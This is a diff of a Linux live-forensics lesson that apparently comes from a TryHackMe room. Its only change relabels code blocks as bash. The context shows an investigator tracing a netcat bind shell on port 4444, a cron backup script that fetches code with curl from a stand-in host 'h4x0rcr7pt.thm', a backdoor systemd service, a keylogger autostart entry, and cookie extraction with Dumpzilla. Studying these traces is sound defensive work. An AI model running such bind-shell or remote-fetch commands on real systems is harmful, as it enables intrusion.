@@ -73,7 +73,7 @@ Start MachineScenario
  We can modify our `PATH` and `LD_LIBRARY_PATH` (shared libraries) environment variables to use these trusted binaries:
 
     Modifying Environment Variables to Include Trusted Paths  
-```Modifying Environment Variables to Include Trusted Paths 
+```bash
 investigator@tryhackme:~$ export PATH=/mnt/usb/bin:/mnt/usb/sbin
 investigator@tryhackme:~$ export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
 ```
@@ -101,7 +101,7 @@ In Linux, a *process*  is a running instance of a program. When you execute a pr
  The `ps` command is a versatile utility in UNIX-like operating systems that reports a snapshot of the active processes on the system. By default, it displays information about processes associated with the current (active running) console session, but it can also be used to gather system-wide and other user's process information. The utility retrieves this information by reading files in the `/proc` virtual filesystem, a hierarchical directory structure corresponding to each process on the running system. To run the command, simply type `ps`:
 
     Viewing Processes with ps  
-```Viewing Processes with ps 
+```bash
 investigator@tryhackme:~$ ps
     PID TTY          TIME CMD
    1335 pts/0    00:00:00 bash
@@ -113,7 +113,7 @@ investigator@tryhackme:~$ ps
     **PID:**  A unique identifier (Process ID) for each process.   **TTY:**  The terminal associated with the process.   **TIME:**  The cumulative CPU time consumed by the process.   **CMD:**  The command associated with the process.    It is also possible to view processes specific to a user (Janice) by using the `-u` or `--user` option followed by the user's username:
 
     Viewing Janice's Processes with ps  
-```Viewing Janice's Processes with ps 
+```bash
 investigator@tryhackme:~$ ps -u janice
     PID TTY          TIME CMD
     773 ?        00:00:00 sh
@@ -126,7 +126,7 @@ investigator@tryhackme:~$ ps -u janice
    A handy set of options to provide with the `ps` command is `-eFH`, which combines several options to return a comprehensive overview of all processes running on the system in a hierarchical format, regardless of the terminal or session to which they are attached. This set of options makes it a valuable tool for system monitoring and forensic analysis:
 
     Viewing All Processes with ps  
-```Viewing All Processes with ps 
+```bash
 investigator@tryhackme:~$ ps -eFH
 UID          PID    PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
 root           2       0  0     0     0   0 15:37 ?        00:00:00 [kthreadd]
@@ -162,7 +162,7 @@ ubuntu      1681       1  0 39155  5728   0 15:39 ?        00:00:00   /usr/libex
  We can further confirm that a named pipe was created by listing the file and noting the `p` file type indicator in the permissions section of the output, which denotes a named pipe:
 
     Listing the Named Pipe in the /tmp Folder  
-```Listing the Named Pipe in the /tmp Folder 
+```bash
 investigator@tryhackme:~$ ls -l /tmp/f
 prw-rw-r-- 1 janice janice 0 Mar 13 15:54 /tmp/f
 ```
@@ -174,7 +174,7 @@ prw-rw-r-- 1 janice janice 0 Mar 13 15:54 /tmp/f
  Let's explore a more powerful way to report a list of all open files and their associated processes within the running system. `lsof` (List Open Files) is a utility that lists information about files opened by processes on a system. In this case, to view any files open by the Netcat process we identified earlier, we can run `lsof` and provide the PID (783):
 
     Listing Open Files with lsof  
-```Listing Open Files with lsof 
+```bash
 investigator@tryhackme:~$ sudo lsof -p 783
 ...
 COMMAND PID   USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
@@ -200,7 +200,7 @@ nc      783 janice    3u  IPv4  28400      0t0     TCP *:4444 (LISTEN)
  We can perform a deeper process analysis of the parent process we identified above (PID: 775) using `pstree` and provide options to list its parent processes (`-s`) and their corresponding PIDs (`-p`):
 
    Illustrating the Process Hierarchy with pstree  
-```Illustrating the Process Hierarchy with pstree 
+```bash
 investigator@tryhackme:~$ pstree -p -s 775
 systemd(1)───cron(706)───cron(769)───sh(773)───abzkd83o4jakxld(775)─┬─cat(781)
                                                                        ├─nc(783)
@@ -214,7 +214,7 @@ systemd(1)───cron(706)───cron(769)───sh(773)───abzkd83o4
  Now that we have a better idea of how the Netcat process was spawned, we can focus on the parent shell and cron processes to see the commands that were run. To do this, we can return to the `ps` command in full-format listing (`-f`) and filter by those specific PIDs we found in the `pstree` output:
 
     Listing Processes with ps  
-```Listing Processes with ps 
+```bash
 investigator@tryhackme:~$ ps -f 769 773 775 783
 UID          PID    PPID  C STIME TTY      STAT   TIME CMD
 root         769     706  0 22:08 ?        S      0:00 /usr/sbin/CRON -f
@@ -228,7 +228,7 @@ janice       783     775  0 22:08 ?        S      0:00 nc -l 0.0.0.0 4444
  This output concludes that a suspicious shell script (`abzkd83o4jakxld.sh`) has been executed from the `/home/janice` directory. If we view the contents of this file, we can confirm that it matches the indicators of a common bind shell one-liner, as discussed earlier:
 
     Viewing the Contents of the Suspicious .sh Script  
-```Viewing the Contents of the Suspicious .sh Script 
+```bash
 investigator@tryhackme:~$ cat /home/janice/abzkd83o4jakxld.sh 
 #!/bin/bash
 
@@ -260,7 +260,7 @@ rm -f "$LOCKFILE"
  We can filter the output to only show processes related to the "Janice" user (`-u janice`), update dynamically every 5 seconds (`-d 5`), and display the full command paths (`-c`):
 
    Listing Real-Time Processes with top  
-```Listing Real-Time Processes with top 
+```bash
 investigator@tryhackme:~$ top -d 5 -c -u janice
 ...
     PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                                                                                                                     
@@ -306,7 +306,7 @@ Cronjobs are scheduled tasks executed automatically at predefined intervals by t
  Cron entries follow a specific format consisting of space-separated fields. Let's first look at an example crontab file for a user named **Bob** . Typically, this file would be located in `/var/spool/cron/crontabs/bob`:
 
     Example Cron Entry  
-```Example Cron Entry 
+```bash
 10 05 * * * /home/bob/backup_tmp.sh
 ```
 
@@ -337,7 +337,7 @@ Cronjobs are scheduled tasks executed automatically at predefined intervals by t
  Firstly, let's focus on `/etc/crontab`, the main repository for system-wide cronjobs. Administrators can configure tasks that require elevated privileges within this file, often executing commands as the root user. To view this file, we can `cat` its contents:
 
     Viewing /etc/crontab  
-```Viewing /etc/crontab 
+```bash
 investigator@tryhackme:~$ cat /etc/crontab
 ...
 SHELL=/bin/sh
@@ -357,7 +357,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  When viewing the contents of this `backup` file, we can determine suspicious additions to the script:
 
     Viewing the Contents of /var/tmp/backup  
-```Viewing the Contents of /var/tmp/backup 
+```bash
 investigator@tryhackme:~$ cat /var/tmp/backup
 #!/bin/bash
 
@@ -378,7 +378,7 @@ tar -czf web_backup.tar.gz /var/www/html && curl -sSL http://h4x0rcr7pt.thm/inst
  With these locations in mind, we can list out any configured cronjobs with the `ls` command:
 
     Listing Additional Cronjobs  
-```Listing Additional Cronjobs 
+```bash
 investigator@tryhackme:~$ ls /etc/cron.d
 anacron  e2scrub_all  popularity-contest
 investigator@tryhackme:~$ ls /etc/cron.hourly
@@ -401,7 +401,7 @@ investigator@tryhackme:~$ ls /etc/cron.monthly
  There are several ways to enumerate this information. The easiest way is to list the contents of the directory with sudo-privileges:
 
     Listing User-Level Cronjobs  
-```Listing User-Level Cronjobs 
+```bash
 investigator@tryhackme:~$ sudo ls -al /var/spool/cron/crontabs/
 total 28
 drwx-wx--T 2 root   crontab 4096 Mar 13 00:05 .
@@ -418,7 +418,7 @@ drwxr-xr-x 5 root   root    4096 Oct 26  2020 ..
  We can view the contents of these files separately (using `cat`) to analyse their contents, or we could use the `crontab` command. This command can manage, create, or view user-level cronjobs. The `-u` argument can be used to specify a specific user's cron configuration, and the `-l` argument can be used to display the contents of the cronjob. To view **Janice** 's cronjobs, we can run:
 
     Viewing Janice's Configured Cronjobs  
-```Viewing Janice's Configured Cronjobs 
+```bash
 investigator@tryhackme:~$ sudo crontab -l -u janice
 ...
 # m h  dom mon dow   command
@@ -430,7 +430,7 @@ investigator@tryhackme:~$ sudo crontab -l -u janice
  Using a clever one-liner command, we can quickly loop through the users on the system and identify if they have any user-level cronjobs configured. If so, we can output the contents of the cronjob entry to the terminal. This type of hybrid automation can help speed up investigations and ensure thorough coverage:
 
     Using a One-Liner to List User Cron Entries  
-```Using a One-Liner to List User Cron Entries 
+```bash
 investigator@tryhackme:~$ sudo bash -c 'for user in $(cut -f1 -d: /etc/passwd); do entries=$(crontab -u $user -l 2>/dev/null | grep -v "^#"); if [ -n "$entries" ]; then echo "$user: Crontab entry found!"; echo "$entries"; echo; fi; done'
 ...
 janice: Crontab entry found!
@@ -455,14 +455,14 @@ bob: Crontab entry found!
  Because the system we're investigating stores cron logs in the **syslog**  file, we can `grep` the contents and filter for any logs related to cron:
 
     Filtering Syslog for Cron Logs  
-```Filtering Syslog for Cron Logs 
+```bash
 investigator@tryhackme:~$ sudo grep cron /var/log/syslog
 ```
 
    The above command will produce a large amount of output. It is a good idea to filter the results further based on specific criteria to focus on relevant information. Some example ideas to filter on include:
 
     Filtering Syslog for Failed Cron Logs  
-```Filtering Syslog for Failed Cron Logs 
+```bash
 investigator@tryhackme:~$ sudo grep cron /var/log/syslog | grep -E 'failed|error|fatal'
 ```
 
@@ -471,7 +471,7 @@ investigator@tryhackme:~$ sudo grep cron /var/log/syslog | grep -E 'failed|error
  We can also filter for specific users:
 
     Filtering Syslog for Bob's Cron Logs  
-```Filtering Syslog for Bob's Cron Logs 
+```bash
 investigator@tryhackme:~$ sudo grep cron /var/log/syslog | grep -i 'bob'
 Mar 13 00:04:35 tryhackme crontab[3016]: (root) LIST (bob)
 Mar 13 00:05:17 tryhackme crontab[3053]: (bob) BEGIN EDIT (bob)
@@ -494,7 +494,7 @@ Mar 13 00:06:32 tryhackme crontab[3259]: (root) LIST (bob)
  In this system, Pspy has been pre-installed along with the mounted binaries we have been using. As such, it is in our path and can be called simply by running `pspy64`. It will begin to monitor in real time, and we should let it run for a few minutes to capture events. It can be stopped by pressing `Ctrl + C`:
 
     Using pspy64 to Monitor Executions  
-```Using pspy64 to Monitor Executions 
+```bash
 investigator@tryhackme$ pspy64
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 
@@ -553,7 +553,7 @@ In Linux, services refer to various background processes or daemons that run con
     `systemctl start <service>` Starts the specified service.   `systemctl stop <service>` Stops the specified service.   `systemctl restart <service>` Restarts the specified service.   `systemctl enable <service>` Enables the specified service to start automatically at boot.   `systemctl disable <service>` Disables the specified service from starting automatically at boot.   `systemctl status <service>` Displays the status of the specified service (e.g., Active, Inactive, Failed).    We can also use `systemctl` to iterate and query all the services on the system using the following syntax:
 
     Listing All System Services  
-```Listing All System Services 
+```bash
 investigator@tryhackme:~$ sudo systemctl list-units --all --type=service
 ```
 
@@ -562,7 +562,7 @@ investigator@tryhackme:~$ sudo systemctl list-units --all --type=service
  Alternatively, we can limit the output to just currently running services with the following command:
 
     Listing Running Services  
-```Listing Running Services 
+```bash
 investigator@tryhackme:~$ sudo systemctl list-units --type=service --state=running
   UNIT                                           LOAD   ACTIVE SUB     DESCRIPTION                                                   
   accounts-daemon.service                        loaded active running Accounts Service                                              
@@ -582,7 +582,7 @@ investigator@tryhackme:~$ sudo systemctl list-units --type=service --state=runni
  To query the service's status, we can use the following command:
 
     Viewing the Backdoor Service  
-```Viewing the Backdoor Service 
+```bash
 investigator@tryhackme:~$ sudo systemctl status b4ckd00rftw.service
 b4ckd00rftw.service - Backdoor Service
      Loaded: loaded (/etc/systemd/system/b4ckd00rftw.service; enabled; vendor preset: enabled)
@@ -604,7 +604,7 @@ b4ckd00rftw.service - Backdoor Service
 Now that we know the binary that is executed when this service starts, we can perform further investigation on the script's contents:
 
     Viewing the Executable Associated with the Backdoor Service  
-```Viewing the Executable Associated with the Backdoor Service 
+```bash
 investigator@tryhackme:~$ cat /usr/local/bin/b4ckd00rftw.sh
 #!/bin/bash
 
@@ -626,7 +626,7 @@ done
  We can read the unit file directly if we know its location, typically in the `/etc/systemd/system/` directory. However, when we queried the status of the service directly, we were given the absolute path of the unit file: `/etc/systemd/system/b4ckd00rftw.service`. We can read the file with the following command:
 
     Viewing the Backdoor Service Unit File  
-```Viewing the Backdoor Service Unit File 
+```bash
 investigator@tryhackme:~$ cat /etc/systemd/system/b4ckd00rftw.service
 [Unit]
 Description=Backdoor Service
@@ -650,7 +650,7 @@ WantedBy=multi-user.target
  To view the logs of a specific service (i.e., the backdoor service) in real time, we can run the following command:
 
     Viewing the Backdoor Service Logs  
-```Viewing the Backdoor Service Logs 
+```bash
 investigator@tryhackme:~$ sudo journalctl -f -u b4ckd00rftw.service
 -- Logs begin at Sun 2022-02-27 13:52:14 UTC. --
 
@@ -726,7 +726,7 @@ Autostart scripts, as the name implies, are scripts or commands executed automat
  The autostart scripts' syntax is usually in the form of `.desktop` files, which are plain text files with a specific format. For example, suppose a user wants to automatically launch a custom script that sets up their development environment upon logging into their Linux desktop. They've written a shell script named `setup_dev_env.sh`, located in their home directory, that updates necessary dependencies, sets up environment variables, and launches their IDE and code editor applications. To automate this process, they can create a `.desktop` file inside `~/.config/autostart/` with the following content:
 
     Example .desktop File  
-```Example .desktop File 
+```bash
 [Desktop Entry]
 Type=Application
 Name=Setup Development Environment
@@ -743,7 +743,7 @@ Exec=/bin/bash -c "/home/eduardo/setup_dev_env.sh"
  During an investigation of this nature, we should quickly list the autostart scripts for all users on the system. Once we identify any entries, we should analyse them further to see what scripts or commands they are performing. To do so, we can run a command like:
 
     Enumerating User Autostart Scripts  
-```Enumerating User Autostart Scripts 
+```bash
 investigator@tryhackme:~$ ls -a /home/*/.config/autostart
 /home/eduardo/.config/autostart:
 .  ..  dev.desktop
@@ -755,7 +755,7 @@ investigator@tryhackme:~$ ls -a /home/*/.config/autostart
    From the above output, we have identified a couple of entries. Specifically, `keygrabber.desktop` under **Janice** 's home directory looks interesting. To view the contents of the autostart entry, we can `cat` the file:
 
     Viewing Janice's Autostart Script  
-```Viewing Janice's Autostart Script 
+```bash
 investigator@tryhackme:~$ cat /home/janice/.config/autostart/keygrabber.desktop
 [Desktop Entry]
 Type=Application
@@ -802,7 +802,7 @@ During live incident investigations, analysing application artefacts can provide
  A good first step in application artefact analysis is determining which applications or programs have been installed on the system. This can be achieved by running the `dpkg -l` command. This command will list all installed packages along with their versions:
 
    Listing All dpkg Installed Packages 
-```Listing All dpkg Installed Packages 
+```bash
 investigator@tryhackme:~$ sudo dpkg -l
 ```
 
@@ -817,7 +817,7 @@ investigator@tryhackme:~$ sudo dpkg -l
  To quickly list out all of the `.viminfo` files stored under the home directory, we can run the following command:
 
    Finding .viminfo Files 
-```Finding .viminfo Files 
+```bash
 investigator@tryhackme:~$ find /home/ -type f -name ".viminfo" 2>/dev/null
 /home/janice/.viminfo
 /home/ubuntu/.viminfo
@@ -828,7 +828,7 @@ investigator@tryhackme:~$ find /home/ -type f -name ".viminfo" 2>/dev/null
  As seen above, we have identified two `.viminfo` files on the system. Since Janice is one of our users of interest, we can analyse the file in more detail by reading its contents:
 
    Viewing Janice's .viminfo File 
-```Viewing Janice's .viminfo File 
+```bash
 investigator@tryhackme:~$ sudo cat /home/janice/.viminfo
 # This viminfo file was generated by Vim 8.1.
 # You may edit it if you're careful!
@@ -859,7 +859,7 @@ investigator@tryhackme:~$ sudo cat /home/janice/.viminfo
  Similar to our method with `.viminfo`, we can quickly list out the browser directories within the workstation's `/home` folder using this command:
 
    Finding Browser Artefact Directories 
-```Finding Browser Artefact Directories 
+```bash
 investigator@tryhackme:~$ sudo find /home -type d \( -path "*/.mozilla/firefox" -o -path "*/.config/google-chrome" \) 2>/dev/null
 /home/ubuntu/.mozilla/firefox
 /home/eduardo/.mozilla/firefox
@@ -870,7 +870,7 @@ investigator@tryhackme:~$ sudo find /home -type d \( -path "*/.mozilla/firefox" 
  The next step in our analysis is identifying the profile we need to analyse. We can list out the Firefox directory with the following syntax:
 
    Listing Firefox Profiles 
-```Listing Firefox Profiles 
+```bash
 investigator@tryhackme:~$ sudo ls -al /home/eduardo/.mozilla/firefox
 total 32
 drwx------  6 eduardo eduardo 4096 Mar 13 14:44  .
@@ -892,7 +892,7 @@ drwx------ 13 eduardo eduardo 4096 Mar 13 15:17  niijyovp.default-release
  Dumpzilla is a very powerful tool. As mentioned, it can extract extensions, bookmarks, cookies, downloads, browsing history, and much more. Since browser profiles can contain potentially sensitive data (like cookies and passwords), we must use sudo to read profiles with elevated privileges. We can run the following syntax to pull down a summary of the data that can be extracted from Eduardo's profile:
 
    Using Dumpzilla.py 
-```Using Dumpzilla.py 
+```bash
 investigator@tryhackme:~$ sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release --Summary --Verbosity CRITICAL
 
 ==================
@@ -917,7 +917,7 @@ Total Sessions             : 0
    In the above output, we can list some interesting metrics. The profile has several bookmarks, cookies, and history that we can extract. By running the `--Help` argument, we can list the available extraction options. Some of the most useful ones include:
 
    Dumpzilla.py Sample Options 
-```Dumpzilla.py Sample Options 
+```bash
 --Addons
  --Search
  --Bookmarks
@@ -929,7 +929,7 @@ Total Sessions             : 0
    For example, to extract the stored **Cookies** , we can run the following command:
 
    Extracting Cookies with Dumpzilla.py 
-```Extracting Cookies with Dumpzilla.py 
+```bash
 investigator@tryhackme:~$ sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release --Cookies
 
 =======
